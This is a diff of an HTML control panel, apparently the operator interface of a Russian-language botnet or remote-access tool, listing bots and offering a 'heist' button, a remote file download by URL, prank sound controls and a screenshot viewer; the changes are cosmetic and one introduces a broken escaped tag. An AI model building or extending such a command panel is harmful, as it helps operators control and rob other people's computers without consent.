@@ -187,22 +187,6 @@
             word-break: break-all;
         }
         
-        .log-info {
-            color: var(--text-color);
-        }
-        
-        .log-success {
-            color: var(--success-color);
-        }
-        
-        .log-error {
-            color: var(--error-color);
-        }
-        
-        .log-command {
-            color: var(--accent-color);
-        }
-        
         .log-timestamp {
             color: var(--secondary-color);
             margin-right: 10px;
@@ -369,19 +353,17 @@
                             <button class="btn-danger" type="button" onclick="sendCommand({action: 'heist'})">ЗАПУСТИТЬ HEIST</button>
                         </div>
                     </section>
-                    <section>
-                        <h2>Загрузка новых файлов</h2>
-                        <input type="text" id="url-input" placeholder="URL...">
-                        <button class="btn-action" type="button" onclick="downloadFile()">Загрузить</button>
+                    &lt;section>
+                    <h2>Загрузка новых файлов</h2>
+                    <input type="text" id="url-input" placeholder="URL...">
+                    <button class="btn-action" type="button" onclick="downloadFile()">Загрузить</button>
                     </section>
                     <section class="section-media">
                         <h2>Пранки и Медиа</h2>
                         <div>
                             <h3>Управление звуком</h3>
                             <div class="volume-control-wrapper">
-                                <input type="range" id="volume-slider" min="0" max="100">
-                                <span id="volume-value">50%</span>
-                            </div>
+                                <input type="range" id="volume-slider" min="0" max="100"><span id="volume-value">50%</span></div>
                             <button class="btn-action" type="button" id="mute-btn" style="margin-top:10px" onclick="sendCommand({action: 'mute'})">Вкл/Выкл Звук</button>
                         </div>
                         <div>
@@ -409,7 +391,6 @@
         </div>
     </div>
     <div id="screenshot-viewer" onclick="this.style.display='none'"><img id="screenshot-image" src="#" alt="Screenshot" style="display: none;"></div>
-
     <script>
         const ui = {
             botList: document.getElementById('bot-list'),
